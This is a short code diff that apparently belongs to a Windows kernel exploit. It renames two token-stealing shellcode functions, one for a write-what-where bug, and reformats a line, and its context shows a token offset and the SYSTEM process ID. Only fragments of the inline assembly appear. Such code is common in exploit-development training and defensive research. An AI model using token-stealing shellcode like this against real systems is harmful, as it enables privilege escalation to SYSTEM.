@@ -7,7 +7,7 @@
 #define TOKEN_OFFSET    0xf8
 #define SYSTEM_PID      0x4
 
-VOID tokenStealingShellcode() {
+VOID token_stealing_shellcode() {
 	__asm {
 		pushad
 
@@ -37,7 +37,9 @@ VOID tokenStealingShellcode() {
 			ret 0x8
 	}
 
-}VOID tokenStealingShellcodeWriteWhatWhere() {
+}
+
+VOID token_stealing_shellcode_write_what_where() {
 	__asm {
 		pushad
 
